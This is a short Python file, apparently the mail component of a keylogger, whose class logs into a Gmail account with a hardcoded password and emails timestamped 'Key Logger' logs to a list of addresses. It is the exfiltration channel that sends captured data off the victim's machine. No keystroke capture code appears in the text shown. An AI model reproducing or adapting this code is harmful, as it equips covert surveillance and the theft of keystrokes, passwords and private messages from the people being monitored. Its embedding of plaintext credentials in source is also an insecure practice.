import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from datetime import datetime

class MailAdapter:
    mypass = "keysword"
    fromaddr = "iipu.key.logger@gmail.com"

    def send(self, message, addresses):
        for toaddr in addresses:
            msg = MIMEMultipart()
            msg['From'] = self.fromaddr
            msg['To'] = toaddr
            msg['Subject'] = "Key Logger. Log " + datetime.strftime(datetime.now(), "%d.%m.%Y %H:%M:%S")

            body = message
            msg.attach(MIMEText(body, 'plain'))

            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(self.fromaddr, self.mypass)
            text = msg.as_string()
            server.sendmail(self.fromaddr, toaddr, text)
            server.quit()